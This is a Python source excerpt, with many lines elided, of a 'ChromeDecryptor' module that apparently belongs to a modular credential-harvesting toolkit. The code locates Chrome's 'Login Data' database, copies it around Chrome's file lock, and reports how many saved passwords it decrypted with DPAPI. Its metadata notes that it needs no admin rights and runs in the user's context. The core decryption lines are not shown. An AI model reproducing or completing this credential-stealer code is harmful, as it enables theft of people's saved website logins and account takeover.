...
Extract and decrypt Chrome saved passwords using DPAPI
"""
...
class ChromeDecryptor:
    ...
    DECRYPTOR_NAME = "chrome"
    REQUIRES_ADMIN = False
    
    def __init__(self, output_dir: Path):
        self.output_dir = Path(output_dir)
        self.chrome_path = os.path.expandvars(
    ...
    def decrypt(self) -> List[Dict]:
        ...
        print(f"[*] Database: {self.chrome_path}")
        ...
        if not os.path.exists(self.chrome_path):
            print(f"[-] Chrome password database not found")
            print(f"[!] Chrome may not be installed or no passwords saved")
            return credentials
        
        try:
            # Copy database (Chrome locks it while running)
            temp_db = self.output_dir / "chrome_temp.db"
            shutil.copy2(self.chrome_path, temp_db)
            
            print(f"[+] Chrome database copied")
            ...
            if not rows:
                print(f"[-] No saved passwords found in Chrome")
                conn.close()
                temp_db.unlink()
                return credentials
            ...
            print(f"\n[+] Successfully decrypted {len(credentials)} Chrome password(s)")
        
        except sqlite3.Error as e:
            print(f"[-] Database error: {e}")
        
        except Exception as e:
            print(f"[-] Chrome decryption failed: {e}")
        
        return credentials
    
    def is_available(self) -> bool:
        """Check if Chrome database exists"""
        return os.path.exists(self.chrome_path) and is_dpapi_available()
    ...
    def get_info() -> Dict:
        ...
        return {
            'name': 'chrome',
            'description': 'Decrypt Google Chrome saved passwords',
            'requires_admin': False,
            'location': r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data',
            'encryption': 'DPAPI (user context)',
            'credential_types': ['website credentials'],
            'notes': [
                'Decrypts passwords saved in Chrome',
                'Requires same user context as Chrome',
                'Database must be copied (locked while Chrome running)',
